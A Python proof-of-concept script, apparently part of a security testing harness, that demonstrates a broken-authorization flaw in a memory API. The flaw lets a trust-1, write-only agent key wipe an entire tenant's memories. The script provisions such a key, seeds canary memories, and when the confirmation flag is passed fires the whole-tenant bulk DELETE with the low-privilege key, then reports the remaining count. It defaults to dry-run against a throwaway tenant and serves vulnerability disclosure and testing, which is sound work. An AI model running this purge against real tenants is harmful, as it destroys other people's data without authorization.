"""PoC: a write-only agent key can purge an entire tenant (broken authz).

The hole
--------
``DELETE /api/v1/memories?tenant_id=<tid>`` (no other filter) soft-deletes
*every* memory in a tenant in one round-trip. The server gates it only on a
key having ``write`` capability scoped to that tenant -- there is **no trust
check** on the bulk delete path. Every argusfleet provenance writer is handed
exactly such a key (trust 1), and that is also the credential most likely to
leak. So one low-privilege write key -- not an admin key -- can wipe a whole
tenant's memory.

What this script does
---------------------
1. Provisions a fresh agent key at ``initial_trust=1`` (the floor -- same
   privilege as a routine provenance writer) via the tenant/admin key.
2. Seeds a few canary memories with the tenant key and confirms count > 0.
3. Calls the whole-tenant purge using *only the trust-1 key*.
4. Re-counts: total drops to 0 -> a write-only credential nuked everything.

Safety
------
This is destructive. By default it runs in --dry-run (stops right before the
purge) and targets the disposable experiments tenant. To actually fire the
purge you must pass --i-understand-this-deletes-everything. Point --tenant at
a throwaway tenant; the harness auto-purges the experiments tenant anyway.

Usage
-----
    # Inspect only -- provisions key, seeds canaries, stops before purge:
    python -m argusfleet.scripts.purge_authz_poc

    # Fire the purge with the trust-1 key (destructive):
    python -m argusfleet.scripts.purge_authz_poc \
        --tenant agent-fleet-mem-3218fb \
        --i-understand-this-deletes-everything
"""
from __future__ import annotations

import argparse
import asyncio

import httpx

from argusfleet.harness.client import MemClawClient
from argusfleet.harness.config import load_config

# Disposable tenant the harness already auto-purges between runs.
DEFAULT_DEMO_TENANT = "agent-fleet-mem-3218fb"
VICTIM_AGENT = "af-poc-victim"
ATTACKER_AGENT = "af-poc-attacker"


async def provision_low_trust_key(http: httpx.AsyncClient, base: str, tenant_key: str) -> str:
    """Mint an agent key at the lowest trust -- a stand-in for a fleet writer."""
    r = await http.post(
        f"{base}/admin/agent-keys/provision",
        headers={"X-API-Key": tenant_key},
        json={
            "agent_id": ATTACKER_AGENT,
            "label": "argusfleet purge-authz PoC (trust 1, write only)",
            "initial_fleet": "fleet-0",
            "initial_trust": 1,
        },
    )
    if r.status_code >= 400:
        raise SystemExit(f"provision -> {r.status_code}: {r.text[:300]}")
    j = r.json()
    key = j.get("raw_key") or j.get("key") or j.get("api_key")
    if not key:
        raise SystemExit(f"provision: no raw_key in {list(j.keys())}")
    return key


async def seed_canaries(client: MemClawClient, tenant: str, n: int) -> None:
    """Write a handful of distinct memories so the purge has something to destroy."""
    for i in range(n):
        await client.write_memory(
            tenant_id=tenant,
            agent_id=VICTIM_AGENT,
            fleet_id="fleet-0",
            content=f"argusfleet purge-PoC canary #{i} -- irreplaceable provenance row {i}",
            write_mode="fast",
        )


async def total_memories(client: MemClawClient, tenant: str) -> int:
    resp = await client.count_memories(tenant_id=tenant)
    stats = resp.json or {}
    # Server reports the live (non-deleted) total under "total".
    return int(stats.get("total", stats.get("count", -1)))


async def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--tenant", default=DEFAULT_DEMO_TENANT,
                    help="disposable tenant to demonstrate against")
    ap.add_argument("--seed-count", type=int, default=3,
                    help="how many canary memories to plant before the purge")
    ap.add_argument("--i-understand-this-deletes-everything", action="store_true",
                    dest="confirm",
                    help="actually fire the whole-tenant purge (destructive)")
    args = ap.parse_args()

    cfg = load_config()
    if not cfg.api_key:
        raise SystemExit("MEMCLAW_API_KEY (tenant/admin key) is required to run the PoC")
    base = cfg.base_url.rstrip("/") + "/api/v1"
    tenant = args.tenant

    print(f"target  : {base}  tenant={tenant}")
    print(f"hole    : DELETE /memories?tenant_id= is gated on write capability, NOT trust\n")

    async with httpx.AsyncClient(timeout=cfg.request_timeout_s) as http:
        # 1. Mint the weakest possible credential: trust-1, write-capable.
        attacker_key = await provision_low_trust_key(http, base, cfg.api_key)
        print(f"[1] provisioned attacker key: agent={ATTACKER_AGENT} fleet=fleet-0 trust=1 (write only)")

    # Seed using the legitimate tenant key; purge using ONLY the trust-1 key.
    async with MemClawClient(base_url=cfg.base_url, api_key=cfg.api_key,
                             max_retries=cfg.max_retries) as tenant_client:
        await seed_canaries(tenant_client, tenant, args.seed_count)
        before = await total_memories(tenant_client, tenant)
        print(f"[2] seeded {args.seed_count} canaries -> tenant now holds {before} live memories")

        if not args.confirm:
            print("\n[dry-run] would now call, with the TRUST-1 key:")
            print(f"          DELETE {base}/memories?tenant_id={tenant}")
            print("          (no fleet/agent/type filter -> clears the whole tenant)")
            print("\nRe-run with --i-understand-this-deletes-everything to fire it.")
            # Clean up our own canaries so dry-run is side-effect-free.
            await tenant_client.delete_all_memories(tenant_id=tenant, agent_id=VICTIM_AGENT)
            return

        # 3. The exploit: purge the entire tenant using the trust-1 key only.
        async with MemClawClient(base_url=cfg.base_url, api_key=attacker_key,
                                 max_retries=cfg.max_retries) as attacker_client:
            resp = await attacker_client.delete_all_memories(tenant_id=tenant)
            print(f"[3] trust-1 key issued whole-tenant purge -> HTTP {resp.status_code}")

        # 4. Show the damage.
        after = await total_memories(tenant_client, tenant)
        print(f"[4] tenant now holds {after} live memories (was {before})\n")

        if after == 0 and before > 0:
            print("VULNERABLE: a trust-1, write-only agent key wiped the entire tenant.")
        else:
            print("Inconclusive: count did not drop to 0 -- check server authz behaviour.")


if __name__ == "__main__":
    asyncio.run(main())
